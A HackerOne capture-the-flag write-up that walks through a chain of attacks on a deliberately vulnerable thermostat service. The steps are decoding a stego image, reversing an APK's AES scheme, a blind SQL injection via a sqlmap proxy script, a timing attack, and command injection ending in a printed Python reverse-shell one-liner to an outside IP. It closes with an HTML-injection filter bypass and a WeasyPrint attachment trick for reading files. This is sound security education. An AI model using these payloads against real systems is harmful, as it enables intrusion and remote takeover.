@@ -1,0 +1,420 @@
+ReportLink:https://hackerone.com/reports/529371
+WeaknessName:Code Injection
+Reporter:https://hackerone.com/bitk
+ReportedTo:50m-ctf(50m-ctf)
+BountyAmount:
+Severity:critical
+State:Closed
+DateOfDisclosure:08.04.2019 15:53:09
+
+Summary:
+
+h1 50M  CTF
+===========
+
+
+This is my solution for the h1 ctf.
+
+On the 27th of february h1 posted this tweet:
+
+![](https://i.imgur.com/7Zlw4lx.png)
+
+Since there is no link no any sort of challenge I supposed the challenges is self contained inside this tweet.
+
+My guess was the first clue is inside the embeded picture, and since the second one contain a flag, I started with this one.
+
+Step 1: Pixels
+--------------
+
+The image look like this.
+
+
+![](https://i.imgur.com/LZqKy2n.jpg)
+
+There is two way to extract the link for the next step:
+- Reading all the binary on the image
+- Extracting the hiden data using steganography tools like stegsolve
+
+After writing down all the binary code down, I did a small python script to display the output
+
+```python
+import re
+
+# the whole binary string in the picture
+binary_str = (
+    "0111101001101100011010010110001000101011"
+    "0111100010011100010010111100101000101100"
+    "1101000101001011110010011101011111001111"
+    "0011000000101100110010010100100000101101"
+    "1100101000000101000000000010010111010010"
+    "0000010100101001"
+) 
+
+# split the full string into substring of 8 chars
+char_regex = re.compile("[0,1]{8}") 
+chars = char_regex.findall(binary_str)
+
+# Convert the binary to int then to char
+zlib_txt = "".join(chr(int(c, 2)) for c in chars)
+print(repr(zlib_txt))
+
+# Remove the hint "zlib+" and decode using zlib
+ascii_txt = zlib_txt[5:].decode("zlib")
+print(ascii_txt)
+
+### output ###
+# 'zlib+x\x9cK\xca,\xd1K\xc9\xd7\xcf0,\xc9H-\xca\x05\x00%\xd2\x05)'
+# bit.do/h1therm
+##############
+```
+
+Following the link we get access to an APK
+
+
+Step 2: The APK
+---------------
+
+Once open the apk greet you with a login page where it ask for username and password.
+
+Using tools like dex2jar allow us to see the actual source code of the application. Let's look at the code to see how it communicate with the backend.
+
+When you touch the sign in button the function `attemptLogin` is called.
+
+```java
+private void attemptLogin()
+    throws Exception
+  {
+...
+  // A json Object is created with our username, password and the getTemp cmd
+  localObject = new JSONObject();
+  ((JSONObject)localObject).put("username", username);
+  ((JSONObject)localObject).put("password", password);
+  ((JSONObject)localObject).put("cmd", "getTemp");
+  
+  // Is Object is then converted to a PayloadRequest before being sent
+  Volley.newRequestQueue(this).add(new PayloadRequest((JSONObject)localObject,new Response.Listener())
+
+
+...
+```
+
+The PayloadRequest is an AES/CBC encrypted payload sent over HTTP Post.
+
+The key is hardcoded and equal to  `[56, 79, 46, 106, 26, 5, 229, 34, 59, 128, 233, 96, 160, 166, 80, 116]` or `384f2e6a1a05e5223b80e960a0a65074`
+
+```java
+  public PayloadRequest(JSONObject paramJSONObject, Response.Listener<String> paramListener)
+    throws Exception
+  {
+    super(1, "http://35.243.186.41/", new Response.ErrorListener()
+    {
+      public void onErrorResponse(VolleyError paramAnonymousVolleyError)
+      {
+        PayloadRequest.this.onResponse("Connection failed");
+      }
+    });
+    this.mListener = paramListener;
+    this.mParams = new HashMap();
+    this.mParams.put("d", buildPayload(paramJSONObject));
+  }
+  
+  private String buildPayload(JSONObject paramJSONObject)
+    throws Exception
+  {
+    Object localObject = new SecretKeySpec(new byte[] { 56, 79, 46, 106, 26, 5, -27, 34, 59, -128, -23, 96, -96, -90, 80, 116 }, "AES");
+    byte[] arrayOfByte = new byte[16];
+    new SecureRandom().nextBytes(arrayOfByte);
+    IvParameterSpec localIvParameterSpec = new IvParameterSpec(arrayOfByte);
+    Cipher localCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+    localCipher.init(1, (Key)localObject, localIvParameterSpec);
+    paramJSONObject = localCipher.doFinal(paramJSONObject.toString().getBytes());
+    localObject = new byte[paramJSONObject.length + 16];
+    System.arraycopy(arrayOfByte, 0, localObject, 0, 16);
+    System.arraycopy(paramJSONObject, 0, localObject, 16, paramJSONObject.length);
+    return Base64.encodeToString((byte[])localObject, 0);
+  }
+}
+```
+
+Now we now how requests are made, it's just a JSON Post request with an encrypted Json object looking like this
+
+```json
+
+{"d": aes_encrypt({"username": "alice", "password": "hunter2", "cmd": "getTemp"})}
+
+```
+And using the same AES key we can read the response
+
+
+Step 3: Inject me
+-----------------
+After playing a bit with the api I noticed a Blind SQL injection vunerability.
+Because I'm lazy I wanted to use sqlmap to extract the data, and because I was fighting a huge hangover I forgot about sqlmap  temper script. 
+So I choosed to make a small flask webserver to serv as a proxy for the real one, making all the required transformations.
+
+
+```python
+from Crypto import Random
+import json
+import base64
+import requests
+
+app = Flask(__name__)
+URL = "http://35.243.186.41/"
+
+key = "".join(
+    chr(x)
+    for x in [56, 79, 46, 106, 26, 5, 229, 34, 59, 128, 233, 96, 160, 166, 80, 116]
+)
+block_size = AES.block_size
+
+unpad = lambda s: s[0 : -ord(s[-1])]
+
+
+def pad(plain_text):
+    number_of_bytes_to_pad = block_size - len(plain_text) % block_size
+    ascii_string = chr(number_of_bytes_to_pad)
+    padding_str = number_of_bytes_to_pad * ascii_string
+    padded_plain_text = plain_text + padding_str
+    return padded_plain_text
+
+
+def encode(obj):
+    iv = Random.new().read(AES.block_size)
+
+    js = json.dumps(obj)
+    padded_js = pad(js)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    encrypted_text = cipher.encrypt(padded_js)
+
+    final = base64.b64encode(iv + encrypted_text)
+    return final
+
+
+def decode(s):
+    x = s.decode("base64")
+    iv, encrypted_text = x[:16], x[16:]
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    return cipher.decrypt(encrypted_text)
+
+
+@app.route("/")
+def index():
+
+	# Get the username from the query
+    username = request.args.get("username")
+	
+	# create a json object with our username and some valid data
+    payload = {
+	"username": username,
+	"password": "password",
+	"cmd": "getTemp"
+    }
+
+    # Encrypt it with AES
+    data = {"d": encode(payload)}
+
+
+    # Send it to the real server
+    r = requests.post(URL, data=data).text
+	
+	# Decrypt and display the output
+    return unpad(decode(r))
+
+
+if __name__ == "__main__":
+    app.run(debug=True, threaded=False)
+
+```
+Using this server and setting sqlmap to attack `http://localhost:5000?username=` I was able to easily extract two tables from the database
+
+#### Users
+| id|username|password|
+|:-:|:------:|:------:|
+|1|admin|5f4dcc3b5aa765d61d8327deb882cf99 (password)|
+
+#### Devices
+|id|ip|
+|:-:|:--:|
+1|192.88.99.253
+2|192.88.99.252
+...|......
+151|192.88.99.59
+
+
+Using nmap to scan all the ip, only one seems to be up and running a HTTP server. 
+
+
+Step 4: Timming is the key
+--------------------------
+
+Once again we face a login page, this time it included a login.js file that calculating a hash of our username/password and sending it instead of our credentials.
+
+After spending waaaay to much time on reversing the hash function I realised that the server was responding differently if I sent a "valid" 64 chars long hash or a random string.
+
+The difference was in the timming response, the valid hash always took 500ms more.
+This look like a typical timming attack.
+
+The checking function take a different amount of time to respond according to the number of valid byte. With this information I was able to make a simple python script to test all possible byte for the first char, save the value with the longest time to respond and continue until the end.
+
+The valid hash was the following `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13`
+
+
+Step 5: RCE
+-----------
+
+Once logged in we got access to an update page only displaying this message.
+
+```
+Connecting to http://update.flitethermostat:5000/ and downloading update manifest
+...
+...
+...
+Could not connect
+```
+
+I quickly noticed that you can submit a `port` parameter in your GET request to make the port change. But I didn't find any way to trigger an RCE or SSRF.
+
+I also tried to bruteforce some kind of host parameter but no luck.
+
+The next day an user from the H1 discord channel (spaceraccoon) told me he found the host parameter it was `'update_host'`
+
+
+Okay, let's check to see if this parameter is vulnerable to some command injection.
+
+```
+GET /update?update_host=$(id)
+
+Connecting to http://uid=0(root) gid=0(root) groups=0(root)
+and downloading update manifest
+...
+...
+...
+Could not connect
+```
+
+Perfect!
+I now have root command execution on one of the server.
+
+
+Step 6: Pivoting for the win
+----------------------------------
+
+Using a small python code I can start a remote shell on the remote server: 
+
+```
+GET /update_host?update=$(python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.1.1.1",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-pi"]);')
+```
+
+While listening on my server with netcat
+(pro tip: use rlwrap around netcat for a better shell experience)
+
+```
+$> rlwrap nc -l -p 12345 -v
+Connection from 0.0.0.0:59820
+bash-4.4# id 
+uid=0(root) gid=0(root) groups=0(root)
+bash-4.4# 
+```
+
+Now I got a shell but no flag on the machine. So I decided to install nmap and scan the network.
+
+nmap found an other machine running on 172.28.0.3 with an open port 80.
+
+To make this easier I made a mirror of  the website using `wget  --mirror` to look at it from my own machine
+
+
+
+Step 7: HTML to PDF
+----------------------------------
+
+One of the page on 172.28.0.3 was an invoice service doing HTML to PDF.
+
+This is the data to send to the server to get a valid pdf.
+
+```json
+{
+  "companyName":"BitK Inc",
+  "email":"bitk@bi.tk",
+  "invoiceNumber":"0001",
+  "date":"1970-01-01",
+  "items":[
+    ["1", "", "", "10"]
+	],
+  "styles": {
+	"body":{
+	  "background-color": "white"
+	}
+  }
+}
+```
+
+Your are able to add any entry to the style element and it will be converted to css.
+So instead of `"background-color":"white"` I put `"background-image": "url(https://bi.tk/h1ctf)"`
+
+And in my server log I saw a query to `/h1ctf` with the useragent `WeasyPrint 44 (http://weasyprint.org/)`.
+
+Now I know what tool is used to do this conversion. But the 44th version of WeasyPrint was the latest. Maybe there is a vulnerability inside WeasyPrint.
+
+
+Also, while nearly all the fields where tested against HTML injection, It was possible to create a bogus style to close the tag and inject our own HTML.
+The server try to remove any instance of `</style>` in our request. To bypass this simply send `</st</style>yle>`, the `</style>` in the middle will be removed, leaving you with only the closing tag.
+
+```json
+{
+  "companyName":"BitK Inc",
+  "email":"bitk@bi.tk",
+  "invoiceNumber":"0001",
+  "date":"1970-01-01",
+  "items":[
+    ["1", "", "", "10"]
+	],
+  "styles": {
+	"</st</style>yle><h1>Injected HTML</h1>":{
+	  "background-color": "white"
+	}
+  }
+}
+```
+
+But weasyprint do not evaluate javascript anyway.
+First I tried to include localfile as images or font but without success.
+
+
+Step 8: Vulnerability as a feature
+----------------------------------
+
+After downloading and look at WeasyPrint source code I found an interesting feature.
+
+Weasprint has a special handler for links with `rel=attachment` If it find one, it will fetch the link and include it as a attachement in the generated pdf.
+
+Using our injected html from before I create a link pointing to
+`/app/main.py` and get the file as an attachement of the pdf.
+
+
+
+
+```python
+"""
+CONGRATULATIONS!
+
+If you're reading this, you've made it to the end of the road for this CTF.
+
+Go to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.
+Make sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!
+
+Congratulations again, and I'm sorry for the red herrings. :)
+"""
+
+...
+```
+
+
+Here is the end of the CTF.
+
+
+Huge thanks to Cody for making this CTF. It was a lot of fun to solve and It was also nice to be in SF to be able to drink some beers with you afterwards
+
+## Impact
+
+-
